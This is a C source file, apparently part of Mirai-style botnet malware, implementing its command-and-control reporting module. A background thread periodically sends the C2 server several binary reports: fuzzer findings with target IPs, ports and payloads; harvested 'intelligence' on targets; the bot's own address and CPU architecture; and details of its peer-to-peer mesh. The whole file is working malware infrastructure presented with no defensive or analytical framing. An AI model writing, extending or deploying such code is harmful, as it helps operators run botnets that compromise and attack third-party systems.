#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include "includes.h"
#include "fuzzer.h"
#include "p2p_mesh.h"
extern int fd_serv;
extern volatile sig_atomic_t shutdown_requested;
static int cnc_check_connection(void)
{
    if(fd_serv < 0) return 0;
    int error = 0;
    socklen_t len = sizeof(error);
    if(getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &error, &len) != 0 || error != 0) {
        return 0;
    }
    return 1;
}
void cnc_send_fuzzer_report(struct fuzz_result *result)
{
    if(!cnc_check_connection()) return;
    if(!result) return;
    char report[FUZZER_MAX_PAYLOAD_SIZE + 16];
    int pos = 0;
    report[pos++] = 0xFF;
    report[pos++] = 0xFE; 
    *(ipv4_t*)(report + pos) = result->target_ip;
    pos += 4;
    *(uint16_t*)(report + pos) = htons(result->target_port);
    pos += 2;
    report[pos++] = result->protocol;
    report[pos++] = result->mutation_type;
    uint16_t payload_size = (result->payload_size > FUZZER_MAX_PAYLOAD_SIZE) ? 
                            FUZZER_MAX_PAYLOAD_SIZE : result->payload_size;
    *(uint16_t*)(report + pos) = htons(payload_size);
    pos += 2;
    if(payload_size > 0) {
        memcpy(report + pos, result->payload, payload_size);
        pos += payload_size;
    }
    uint16_t total_len = htons(pos + 2);
    struct iovec iov[2];
    iov[0].iov_base = &total_len;
    iov[0].iov_len = 2;
    iov[1].iov_base = report;
    iov[1].iov_len = pos;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = iov;
    msg.msg_iovlen = 2;
    if(sendmsg(fd_serv, &msg, MSG_NOSIGNAL) < 0) {
        return;
    }
}
void cnc_send_p2p_intelligence(void)
{
    if(!cnc_check_connection()) return;
    uint32_t count = 0;
    struct target_info *infos = p2p_mesh_get_intelligence_queue(&count);
    if(count == 0 || !infos) return;
    const uint32_t max_items = (4096 - 10) / sizeof(struct target_info);
    if(count > max_items) {
        count = max_items;
    }
    char report[4096];
    int pos = 0;
    report[pos++] = 0xFF;
    report[pos++] = 0xFD; 
    *(uint32_t*)(report + pos) = htonl(count);
    pos += 4;
    for(uint32_t i = 0; i < count && pos + sizeof(struct target_info) <= sizeof(report); i++) {
        memcpy(report + pos, &infos[i], sizeof(struct target_info));
        pos += sizeof(struct target_info);
    }
    free(infos); 
    uint16_t total_len = htons(pos + 2);
    struct iovec iov[2];
    iov[0].iov_base = &total_len;
    iov[0].iov_len = 2;
    iov[1].iov_base = report;
    iov[1].iov_len = pos;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = iov;
    msg.msg_iovlen = 2;
    if(sendmsg(fd_serv, &msg, MSG_NOSIGNAL) < 0) {
        return;
    }
}
static const char* get_bot_arch(void)
{
    #if defined(__x86_64__) || defined(_M_X64)
        return "x86_64";
    #elif defined(__i386__) || defined(_M_IX86)
        return "x86";
    #elif defined(__aarch64__) || defined(_M_ARM64)
        return "aarch64";
    #elif defined(__arm__) || defined(_M_ARM)
        return "arm";
    #elif defined(__mips__)
        return "mips";
    #elif defined(__mips64__)
        return "mips64";
    #elif defined(__powerpc64__)
        return "ppc64";
    #elif defined(__powerpc__)
        return "ppc";
    #else
        return "unknown";
    #endif
}
void cnc_send_self_peer_info(void)
{
    if(!cnc_check_connection()) return;
    extern ipv4_t LOCAL_ADDR;
    char peer_report[32];
    int pos = 0;
    peer_report[pos++] = 0xFF;
    peer_report[pos++] = 0xFC; 
    *(ipv4_t*)(peer_report + pos) = LOCAL_ADDR;
    pos += 4;
    *(uint16_t*)(peer_report + pos) = htons(P2P_MESH_PORT);
    pos += 2;
    peer_report[pos++] = 1; 
    const char *arch = get_bot_arch();
    uint8_t arch_len = strlen(arch);
    if(arch_len > 15) arch_len = 15;
    peer_report[pos++] = arch_len;
    memcpy(peer_report + pos, arch, arch_len);
    pos += arch_len;
    uint16_t total_len = htons(pos + 2);
    struct iovec iov[2];
    iov[0].iov_base = &total_len;
    iov[0].iov_len = 2;
    iov[1].iov_base = peer_report;
    iov[1].iov_len = pos;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = iov;
    msg.msg_iovlen = 2;
    sendmsg(fd_serv, &msg, MSG_NOSIGNAL);
}
static void *cnc_report_worker_thread(void *arg)
{
    uint32_t failed_attempts = 0;
    uint32_t self_report_counter = 0;
    while(1) {
        if(shutdown_requested) {
            break;
        }
        sleep(60); 
        if(!cnc_check_connection()) {
            failed_attempts++;
            if(failed_attempts > 5) {
                sleep(300);
                failed_attempts = 0;
            }
            continue;
        }
        failed_attempts = 0; 
        self_report_counter++;
        if(self_report_counter >= 5) {
            self_report_counter = 0;
            if(cnc_check_connection()) {
                cnc_send_self_peer_info();
            }
        }
        uint32_t count = 0;
        struct fuzz_result *results = fuzzer_get_results(&count);
        if(results && count > 0) {
            uint32_t send_count = (count > 10) ? 10 : count;
            for(uint32_t i = 0; i < send_count; i++) {
                if(!cnc_check_connection()) break;
                cnc_send_fuzzer_report(&results[i]);
                usleep(50000); 
            }
        }
        if(cnc_check_connection()) {
            cnc_send_p2p_intelligence();
        }
        if(cnc_check_connection()) {
            uint32_t peer_count = 0;
            struct p2p_peer *peers = p2p_mesh_get_peers(&peer_count);
            if(peers && peer_count > 0) {
                uint32_t send_count = (peer_count > 5) ? 5 : peer_count;
                for(uint32_t i = 0; i < send_count && cnc_check_connection(); i++) {
                    char peer_report[32];
                    int pos = 0;
                    peer_report[pos++] = 0xFF;
                    peer_report[pos++] = 0xFC; 
                    *(ipv4_t*)(peer_report + pos) = peers[i].ip;
                    pos += 4;
                    *(uint16_t*)(peer_report + pos) = htons(peers[i].port);
                    pos += 2;
                    peer_report[pos++] = peers[i].version;
                    uint8_t arch_len = strlen(peers[i].arch);
                    if(arch_len > 15) arch_len = 15;
                    peer_report[pos++] = arch_len;
                    memcpy(peer_report + pos, peers[i].arch, arch_len);
                    pos += arch_len;
                    uint16_t total_len = htons(pos + 2);
                    struct iovec iov[2];
                    iov[0].iov_base = &total_len;
                    iov[0].iov_len = 2;
                    iov[1].iov_base = peer_report;
                    iov[1].iov_len = pos;
                    struct msghdr msg;
                    memset(&msg, 0, sizeof(msg));
                    msg.msg_iov = iov;
                    msg.msg_iovlen = 2;
                    sendmsg(fd_serv, &msg, MSG_NOSIGNAL);
                    usleep(50000);
                }
            }
        }
    }
    return NULL;
}
void cnc_report_worker(void)
{
    pthread_t thread;
    pthread_create(&thread, NULL, cnc_report_worker_thread, NULL);
    pthread_detach(thread);
}
